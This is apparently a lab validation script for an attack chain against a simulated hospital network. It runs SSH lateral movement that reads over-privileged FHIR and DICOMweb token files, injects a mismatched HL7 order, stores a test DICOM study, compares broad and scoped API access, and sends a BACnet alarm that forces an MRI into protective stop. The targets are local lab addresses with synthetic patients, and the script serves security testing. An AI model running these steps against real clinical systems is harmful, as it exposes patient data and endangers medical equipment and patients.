#!/usr/bin/env bash
# 手動攻擊鏈驗證（不依賴 CALDERA）
# 含：SSH 橫向、HL7、DICOM、DICOMweb/FHIR 真授權對照、真 BACnet→MRI
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

KEY="${ROOT}/keys/id_ed25519"
PACS_USER="${PACS_USER:-overprivileged}"
PACS_PASS="${PACS_PASS:-lab-dicomweb-token-overprivileged}"
PACS_SCOPED_USER="${PACS_SCOPED_USER:-scoped}"
PACS_SCOPED_PASS="${PACS_SCOPED_PASS:-lab-dicomweb-token-patient001}"
FHIR_TOKEN="${FHIR_TOKEN:-lab-fhir-token-overprivileged}"
FHIR_SCOPED="${FHIR_SCOPED_TOKEN:-lab-fhir-token-patient001}"
FHIR_HOST_PORT="${FHIR_HOST_PORT:-8180}"
FHIR_BASE="http://127.0.0.1:${FHIR_HOST_PORT}/fhir"

pass() { echo "[PASS] $*"; }
fail() { echo "[FAIL] $*"; exit 1; }
info() { echo "[INFO] $*"; }

need_tools() {
  command -v python3 >/dev/null || fail "python3 required on host"
  [[ -f "$KEY" ]] || fail "missing SSH key $KEY"
}

send_hl7() {
  python3 - <<'PY'
import socket
from datetime import datetime, timezone
SB, EB, CR = b"\x0b", b"\x1c", b"\x0d"
now = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S")
# 錯配：同一 accession 對到錯誤 PID（示範可觀測異常）
msg = "\r".join([
    f"MSH|^~\\&|HIS|HOSP|RIS|HOSP|{now}||ORM^O01|ATTACK-ORM-DUP-001|P|2.5",
    "PID|||patient-002||SYNTHETIC^PATIENT^002",
    f"ORC|NW|ACC-001||||||{now}",
    f"OBR|1|ACC-001|ACC-001|MRI^MRI BRAIN|||{now}||||||||||||||||MR",
])
body = msg.encode() + CR
payload = SB + body + EB + CR
with socket.create_connection(("127.0.0.1", 2575), timeout=10) as s:
    s.sendall(payload)
    print(s.recv(4096).decode("utf-8", errors="replace"))
PY
}

dicom_test_store() {
  docker compose exec -T protocol-runner dicom-test-store \
    --host 10.77.40.10 --port 11112 \
    --accession TEST-ATTACK-001 --patient-id patient-999
}

bacnet_alarm() {
  # 預設真 BACnet WriteProperty；失敗時可改 --via bms
  docker compose exec -T protocol-runner bacnet-write --value ALARM --via bacnet \
    --chiller-host 10.77.50.20 --local-address 10.77.50.40/24
}

need_tools

info "0) SSH 橫向 vendor→biomed 並讀取過寬 Token（ENV-04/05）…"
TOKENS="$(ssh -i "$KEY" -p 2221 \
  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes \
  vendor@127.0.0.1 \
  'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes biomed@10.77.20.10 "cat /opt/hospital/creds/fhir.token; echo; cat /opt/hospital/creds/dicomweb.token"')"
echo "$TOKENS" | grep -q 'lab-fhir-token-overprivileged' || fail "did not harvest FHIR overpriv token via SSH path"
echo "$TOKENS" | grep -q 'lab-dicomweb-token-overprivileged' || fail "did not harvest DICOMweb overpriv token via SSH path"
pass "harvested overprivileged tokens via vendor→biomed"

info "1) HL7 醫囑錯配／重送…"
send_hl7
sleep 1
WL="$(curl -sf http://127.0.0.1:8085/worklist)"
echo "$WL" | grep -q 'patient-002' || fail "worklist missing mismatched PID"
COUNT="$(python3 - <<'PY'
import json,urllib.request
data=json.load(urllib.request.urlopen('http://127.0.0.1:8085/worklist'))
print(sum(1 for i in data['items'] if i.get('accession')=='ACC-001'))
PY
)"
[[ "$COUNT" -ge 2 ]] || fail "expected duplicate ACC-001 entries, got $COUNT"
pass "HL7 mismatch / duplicate worklist visible"

info "2) DICOM 測試 C-STORE（TEST- 前綴，DIMSE 仍開放）…"
dicom_test_store
sleep 1
FOUND="$(curl -sf -u "${PACS_USER}:${PACS_PASS}" -X POST http://127.0.0.1:8042/tools/find \
  -H 'Content-Type: application/json' \
  -d '{"Level":"Study","Query":{"AccessionNumber":"TEST-ATTACK-001"}}')"
echo "$FOUND" | grep -q '[a-f0-9]' || fail "TEST study not found in Orthanc: $FOUND"
pass "TEST- study present in Orthanc"

info "3a) DICOMweb：過寬帳號可廣查；scoped 廣查被拒…"
QIDO_OK="$(curl -sf -u "${PACS_USER}:${PACS_PASS}" 'http://127.0.0.1:8042/dicom-web/studies' | head -c 200 || true)"
[[ -n "$QIDO_OK" ]] || fail "overprivileged DICOMweb QIDO failed"
SCOPED_CODE="$(curl -s -o /dev/null -w '%{http_code}' -u "${PACS_SCOPED_USER}:${PACS_SCOPED_PASS}" \
  'http://127.0.0.1:8042/dicom-web/studies' || true)"
[[ "$SCOPED_CODE" == "403" || "$SCOPED_CODE" == "401" ]] || \
  fail "expected scoped broad QIDO deny (403/401), got $SCOPED_CODE"
SCOPED_OK="$(curl -sf -u "${PACS_SCOPED_USER}:${PACS_SCOPED_PASS}" \
  'http://127.0.0.1:8042/dicom-web/studies?PatientID=patient-001' | head -c 200 || true)"
# scoped + patient-001 may return empty list but should not 403
CODE_P1="$(curl -s -o /dev/null -w '%{http_code}' -u "${PACS_SCOPED_USER}:${PACS_SCOPED_PASS}" \
  'http://127.0.0.1:8042/dicom-web/studies?PatientID=patient-001' || true)"
[[ "$CODE_P1" == "200" ]] || fail "scoped QIDO with PatientID=patient-001 expected 200, got $CODE_P1"
pass "DICOMweb overpriv vs scoped scope works"

info "3b) FHIR：過寬 Token 可廣查；scoped 不可查 patient-002…"
FHIR="$(curl -sf -H "Authorization: Bearer ${FHIR_TOKEN}" \
  "${FHIR_BASE}/Patient?_count=20")"
echo "$FHIR" | grep -q 'patient-002' || fail "could not search extra patient with overpriv token"
SCOPED_P2="$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer ${FHIR_SCOPED}" \
  "${FHIR_BASE}/Patient/patient-002" || true)"
[[ "$SCOPED_P2" == "403" ]] || fail "expected scoped FHIR 403 on patient-002, got $SCOPED_P2"
SCOPED_P1="$(curl -sf -H "Authorization: Bearer ${FHIR_SCOPED}" \
  "${FHIR_BASE}/Patient/patient-001")"
echo "$SCOPED_P1" | grep -q 'patient-001' || fail "scoped token should read patient-001"
pass "FHIR over-privileged vs scoped works"

info "4) 真 BACnet WriteProperty → MRI PROTECTIVE_STOP…"
bacnet_alarm || {
  info "bacnet path failed, falling back to BMS HTTP dual-path…"
  docker compose exec -T protocol-runner bacnet-write --value ALARM --via bms
}
sleep 5
MRI="$(curl -sf http://127.0.0.1:8090/status)"
echo "$MRI" | grep -q 'PROTECTIVE_STOP' || fail "MRI not stopped: $MRI"
BMS="$(curl -sf http://127.0.0.1:8091/cooling)"
echo "$BMS" | grep -q 'ALARM' || fail "BMS cooling not ALARM: $BMS"
pass "BACnet ALARM -> MRI PROTECTIVE_STOP"

echo
echo "=== attack-manual-demo PASSED ==="
echo "提示：可用 curl -X POST http://127.0.0.1:8099/reset 恢復基線"
